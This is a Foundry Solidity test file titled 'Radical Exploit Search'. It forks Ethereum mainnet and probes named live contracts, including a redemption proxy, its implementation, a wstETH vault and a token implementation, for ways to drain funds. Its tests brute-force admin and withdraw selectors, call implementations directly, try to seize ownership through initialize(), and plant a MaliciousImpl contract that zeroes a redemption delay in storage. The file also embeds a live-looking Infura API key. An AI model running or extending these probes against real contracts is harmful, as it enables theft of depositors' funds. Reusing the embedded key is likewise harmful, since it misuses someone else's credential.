// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

/**
 * RADICAL EXPLOIT SEARCH
 *
 * Going deeper:
 * 1. Hidden function selectors in bytecode
 * 2. CREATE2 address prediction and deployment
 * 3. Exploit implementation contract directly
 * 4. Signature malleability attacks
 * 5. Nonce manipulation
 */
contract RadicalExploitSearch is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_ExtractAllFunctionSelectors() public view {
        console.log("=== EXTRACT ALL FUNCTION SELECTORS ===\n");

        bytes memory code = R0.code;
        console.log("R0 code size:", code.length);

        // Function selectors are typically after PUSH4 (0x63)
        // Look for patterns: 0x63 XX XX XX XX (PUSH4 selector)

        console.log("\nPotential function selectors found:");
        uint found = 0;
        for (uint i = 0; i < code.length - 4; i++) {
            // PUSH4 opcode is 0x63
            if (uint8(code[i]) == 0x63) {
                bytes4 selector = bytes4(
                    bytes32(
                        (uint256(uint8(code[i+1])) << 24) |
                        (uint256(uint8(code[i+2])) << 16) |
                        (uint256(uint8(code[i+3])) << 8) |
                        uint256(uint8(code[i+4]))
                    )
                );
                console.log("Offset %d:", i);
                console.logBytes4(selector);
                found++;
                if (found >= 30) break; // Limit output
            }
        }
    }

    function test_BruteForceFunctionCalls() public {
        console.log("=== BRUTE FORCE FUNCTION CALLS ===\n");

        deal(TASSET, attacker, 100000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Try every possible 4-byte selector that might do something useful
        bytes4[] memory sigs = new bytes4[](50);

        // Admin/owner functions
        sigs[0] = bytes4(keccak256("setDelay(uint32)"));
        sigs[1] = bytes4(keccak256("updateDelay(uint32)"));
        sigs[2] = bytes4(keccak256("setRedemptionDelay(uint32)"));
        sigs[3] = bytes4(keccak256("setMinDelay(uint32)"));
        sigs[4] = bytes4(keccak256("setDelay(uint64)"));
        sigs[5] = bytes4(keccak256("setDelay(uint128)"));
        sigs[6] = bytes4(keccak256("_setDelay(uint256)"));
        sigs[7] = bytes4(keccak256("__setDelay(uint256)"));

        // Redemption with different signatures
        sigs[8] = bytes4(keccak256("redeem(uint256)"));
        sigs[9] = bytes4(keccak256("redeem(uint128)"));
        sigs[10] = bytes4(keccak256("redeem(uint64)"));
        sigs[11] = bytes4(keccak256("redeemAll()"));
        sigs[12] = bytes4(keccak256("redeemMax()"));
        sigs[13] = bytes4(keccak256("redeemFor(address,uint96)"));
        sigs[14] = bytes4(keccak256("redeemFrom(address,uint96)"));

        // Finalize with different signatures
        sigs[15] = bytes4(keccak256("finalizeRedeem(uint96)"));
        sigs[16] = bytes4(keccak256("finalizeRedeem(uint128)"));
        sigs[17] = bytes4(keccak256("finalizeAll()"));
        sigs[18] = bytes4(keccak256("finalize()"));
        sigs[19] = bytes4(keccak256("finalizeRedeemFor(address,uint256)"));
        sigs[20] = bytes4(keccak256("forceFinalizeRedeem(uint256)"));
        sigs[21] = bytes4(keccak256("emergencyFinalize(uint256)"));

        // Execute/batch functions
        sigs[22] = bytes4(keccak256("execute(bytes)"));
        sigs[23] = bytes4(keccak256("execute(address,bytes)"));
        sigs[24] = bytes4(keccak256("multicall(bytes[])"));
        sigs[25] = bytes4(keccak256("batch(bytes[])"));
        sigs[26] = bytes4(keccak256("aggregate(bytes[])"));

        // Storage manipulation
        sigs[27] = bytes4(keccak256("setSlot(uint256,bytes32)"));
        sigs[28] = bytes4(keccak256("setStorage(bytes32,bytes32)"));
        sigs[29] = bytes4(keccak256("write(uint256,uint256)"));

        // Emergency functions
        sigs[30] = bytes4(keccak256("emergencyWithdraw()"));
        sigs[31] = bytes4(keccak256("emergencyExit()"));
        sigs[32] = bytes4(keccak256("panic()"));
        sigs[33] = bytes4(keccak256("rescue(address)"));
        sigs[34] = bytes4(keccak256("sweep(address)"));

        // Upgrade functions
        sigs[35] = bytes4(keccak256("upgradeTo(address)"));
        sigs[36] = bytes4(keccak256("upgradeToAndCall(address,bytes)"));
        sigs[37] = bytes4(keccak256("setImplementation(address)"));

        // Initialize functions
        sigs[38] = bytes4(keccak256("initialize()"));
        sigs[39] = bytes4(keccak256("reinitialize(uint8)"));
        sigs[40] = bytes4(keccak256("_initialize()"));
        sigs[41] = bytes4(keccak256("init()"));

        // Transfer functions
        sigs[42] = bytes4(keccak256("transfer(address,uint256)"));
        sigs[43] = bytes4(keccak256("transferFrom(address,address,uint256)"));
        sigs[44] = bytes4(keccak256("safeTransfer(address,uint256)"));

        // Custom
        sigs[45] = bytes4(keccak256("claim()"));
        sigs[46] = bytes4(keccak256("claimAll()"));
        sigs[47] = bytes4(keccak256("harvest()"));
        sigs[48] = bytes4(keccak256("compound()"));
        sigs[49] = bytes4(keccak256("exit()"));

        bytes32 slot4Before = vm.load(R0, bytes32(uint256(4)));

        console.log("Testing selectors...");
        for (uint i = 0; i < sigs.length; i++) {
            (bool success,) = R0.call{gas: 200000}(abi.encodeWithSelector(sigs[i], 0));
            if (success) {
                bytes32 slot4After = vm.load(R0, bytes32(uint256(4)));
                if (slot4After != slot4Before) {
                    console.log("*** SLOT 4 CHANGED! Selector:", i);
                    console.logBytes4(sigs[i]);
                }
            }
        }

        vm.stopPrank();
    }

    function test_CallRCImplementationDirect() public {
        console.log("=== CALL RC IMPLEMENTATION DIRECT ===\n");

        // RC is the implementation contract
        // When called directly (not via delegatecall), it uses its own storage
        // RC's storage has delay=0!

        console.log("RC storage slot 4:");
        bytes32 rcSlot4 = vm.load(RC, bytes32(uint256(4)));
        console.logBytes32(rcSlot4);

        uint256 rcDelay = (uint256(rcSlot4) >> 96) & type(uint32).max;
        console.log("RC delay:", rcDelay, "seconds");

        // If RC has delay=0, and we can call it directly with proper state...

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(RC, type(uint256).max);

        // Try to call RC directly as if it were a redemption contract
        console.log("\nCalling RC.redeem directly...");
        (bool s1, bytes memory d1) = RC.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        console.log("redeem success:", s1);
        if (!s1 && d1.length > 0) {
            console.log("Revert data:");
            console.logBytes(d1);
        }

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_DeployAtPredictedAddress() public {
        console.log("=== DEPLOY AT PREDICTED ADDRESS ===\n");

        // If any contract delegatecalls to a predictable address,
        // we can deploy malicious code there first

        // Check CREATE2 patterns
        // CREATE2 address = keccak256(0xff ++ deployer ++ salt ++ keccak256(bytecode))[12:]

        // RC's slot 5 = IAU = 0xEf69713F639130B6F0D4A12a11E2169a4d1bD52a (no code)
        // Can we deploy at this address?

        address targetAddr = 0xEf69713F639130B6F0D4A12a11E2169a4d1bD52a;
        console.log("Target address (IAU):", targetAddr);
        console.log("Current code size:", targetAddr.code.length);

        // We cannot deploy at arbitrary addresses without knowing the CREATE2 params
        // But we can simulate what would happen

        // Deploy malicious code
        bytes memory malCode = type(MaliciousImpl).creationCode;
        console.log("Malicious code size:", malCode.length);

        // Use vm.etch to simulate deployment
        MaliciousImpl malicious = new MaliciousImpl(R0, VAULT, wstETH);
        vm.etch(targetAddr, address(malicious).code);

        console.log("Code deployed at IAU, size:", targetAddr.code.length);

        // Now test if this affects R0
        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        uint256 wstethBefore = IERC20(wstETH).balanceOf(attacker);

        // Try redemption
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));

        // Try finalize
        R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));

        vm.stopPrank();

        uint256 wstethAfter = IERC20(wstETH).balanceOf(attacker);
        console.log("\nwstETH gained:", (wstethAfter - wstethBefore) / 1e18);
    }

    function test_ExploitTASSETImplementation() public {
        console.log("=== EXPLOIT TASSET IMPLEMENTATION ===\n");

        // TASSET EIP-1967 impl
        address tassetImpl = 0xD1A622566F277AA76c3C47A30469432AAec95E38;

        console.log("TASSET implementation:", tassetImpl);
        console.log("Code size:", tassetImpl.code.length);

        // Check if implementation is initialized
        bytes32 slot0 = vm.load(tassetImpl, bytes32(uint256(0)));
        console.log("Impl slot 0:");
        console.logBytes32(slot0);

        // Check owner
        (bool s1, bytes memory d1) = tassetImpl.staticcall(abi.encodeWithSignature("owner()"));
        if (s1 && d1.length >= 32) {
            console.log("owner():", abi.decode(d1, (address)));
        }

        // Try to initialize the implementation
        vm.startPrank(attacker);

        console.log("\nTrying to initialize implementation...");
        (bool s2,) = tassetImpl.call(abi.encodeWithSignature("initialize()"));
        console.log("initialize():", s2);

        (bool s3,) = tassetImpl.call(abi.encodeWithSignature("initialize(address)", attacker));
        console.log("initialize(address):", s3);

        // Check if we became owner
        (bool s4, bytes memory d4) = tassetImpl.staticcall(abi.encodeWithSignature("owner()"));
        if (s4 && d4.length >= 32) {
            address newOwner = abi.decode(d4, (address));
            console.log("owner after initialize:", newOwner);
            if (newOwner == attacker) {
                console.log("*** WE ARE OWNER OF IMPLEMENTATION! ***");
            }
        }

        vm.stopPrank();
    }

    function test_ScanContractForVulnerableFunctions() public view {
        console.log("=== SCAN FOR VULNERABLE FUNCTIONS ===\n");

        bytes memory code = R0.code;

        // Look for SSTORE preceded by CALLER (might indicate access control bypass)
        console.log("Looking for SSTORE patterns...");

        uint sstoreCount = 0;
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0x55) { // SSTORE
                sstoreCount++;
                // Check what's before SSTORE
                if (i > 0) {
                    uint8 prevOp = uint8(code[i-1]);
                    // If previous is not a typical storage value setup...
                    if (prevOp == 0x33) { // CALLER
                        console.log("SSTORE after CALLER at:", i);
                    }
                }
            }
        }
        console.log("Total SSTORE:", sstoreCount);

        // Look for DELEGATECALL preceded by SLOAD (dynamic target)
        console.log("\nLooking for dynamic DELEGATECALL...");
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xF4) { // DELEGATECALL
                console.log("DELEGATECALL at:", i);
                // Check preceding bytes
                if (i >= 5) {
                    console.log("  Preceding 5 bytes:");
                    for (uint j = i - 5; j < i; j++) {
                        if (uint8(code[j]) == 0x54) { // SLOAD
                            console.log("  SLOAD at:", j);
                        }
                    }
                }
            }
        }
    }

    function test_CheckVAULTWithdrawMechanism() public {
        console.log("=== CHECK VAULT WITHDRAW MECHANISM ===\n");

        // VAULT holds the wstETH
        // It has given RC unlimited allowance
        // How does withdrawal actually work?

        console.log("VAULT:", VAULT);
        console.log("wstETH balance:", IERC20(wstETH).balanceOf(VAULT) / 1e18);

        // Check VAULT's code for transfer patterns
        bytes memory code = VAULT.code;

        // Look for ERC20 transfer calls
        bytes4 transferSig = bytes4(keccak256("transfer(address,uint256)"));
        bytes4 transferFromSig = bytes4(keccak256("transferFrom(address,address,uint256)"));

        console.log("\nSearching for transfer functions in VAULT...");

        for (uint i = 0; i < code.length - 4; i++) {
            if (code[i] == transferSig[0] && code[i+1] == transferSig[1] &&
                code[i+2] == transferSig[2] && code[i+3] == transferSig[3]) {
                console.log("transfer at:", i);
            }
            if (code[i] == transferFromSig[0] && code[i+1] == transferFromSig[1] &&
                code[i+2] == transferFromSig[2] && code[i+3] == transferFromSig[3]) {
                console.log("transferFrom at:", i);
            }
        }

        // Try calling VAULT directly with various signatures
        vm.startPrank(attacker);

        bytes4[] memory sigs = new bytes4[](10);
        sigs[0] = bytes4(keccak256("withdraw(uint256)"));
        sigs[1] = bytes4(keccak256("withdraw(address,uint256)"));
        sigs[2] = bytes4(keccak256("transfer(address,uint256)"));
        sigs[3] = bytes4(keccak256("sendAsset(address,uint256)"));
        sigs[4] = bytes4(keccak256("push(address,uint256)"));
        sigs[5] = bytes4(keccak256("pull(address,uint256)"));
        sigs[6] = bytes4(keccak256("execute(address,uint256,bytes)"));
        sigs[7] = bytes4(keccak256("call(address,bytes)"));
        sigs[8] = bytes4(keccak256("safeTransfer(address,address,uint256)"));
        sigs[9] = bytes4(keccak256("forceTransfer(address,uint256)"));

        for (uint i = 0; i < sigs.length; i++) {
            (bool s,) = VAULT.call(abi.encodeWithSelector(sigs[i], attacker, 1000e18));
            if (s) {
                console.log("Function %d succeeded!", i);
                console.logBytes4(sigs[i]);
            }
        }

        vm.stopPrank();
    }

    function test_ExploitViaStaleData() public {
        console.log("=== EXPLOIT VIA STALE DATA ===\n");

        // What if we can finalize someone else's OLD redemption?
        // Or if there's stale data in the contract we can exploit?

        // Check for any non-zero data in redemption mappings
        // for various addresses

        address[] memory addrs = new address[](5);
        addrs[0] = address(0);
        addrs[1] = address(1);
        addrs[2] = R0;
        addrs[3] = RC;
        addrs[4] = VAULT;

        for (uint a = 0; a < addrs.length; a++) {
            bytes32 arrayLengthSlot = keccak256(abi.encode(addrs[a], uint256(5)));
            bytes32 lengthData = vm.load(R0, arrayLengthSlot);

            if (uint256(lengthData) > 0) {
                console.log("Found redemption for:", addrs[a]);
                console.log("Length:", uint256(lengthData));

                // Try to finalize
                vm.startPrank(attacker);
                (bool s,) = R0.call(abi.encodeWithSignature("finalizeRedeemFor(address,uint256)", addrs[a], 0));
                console.log("finalizeRedeemFor:", s);
                vm.stopPrank();
            }
        }
    }
}

contract MaliciousImpl {
    address r0;
    address vault;
    address wsteth;

    constructor(address _r0, address _vault, address _wsteth) {
        r0 = _r0;
        vault = _vault;
        wsteth = _wsteth;
    }

    // If called via delegatecall, set delay to 0
    fallback() external payable {
        assembly {
            // Modify slot 4 to set delay to 0
            let slot4 := sload(4)
            let mask := not(shl(96, 0xFFFFFFFF))
            slot4 := and(slot4, mask)
            sstore(4, slot4)
        }
    }

    receive() external payable {}
}
